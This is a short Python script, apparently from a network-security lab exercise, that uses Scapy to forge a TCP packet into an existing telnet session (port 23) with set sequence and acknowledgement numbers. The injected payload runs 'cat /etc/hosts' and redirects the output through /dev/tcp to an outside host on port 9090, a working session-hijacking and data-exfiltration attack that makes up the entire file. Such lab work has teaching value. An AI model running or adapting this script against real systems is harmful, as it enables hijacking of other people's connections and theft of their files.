#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=34224, dport=23, flags="A", seq=3477323847, ack=3103900556)
data = "\r cat /etc/hosts > /dev/tcp/192.168.253.128/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0,iface='br-4b43672156a8')
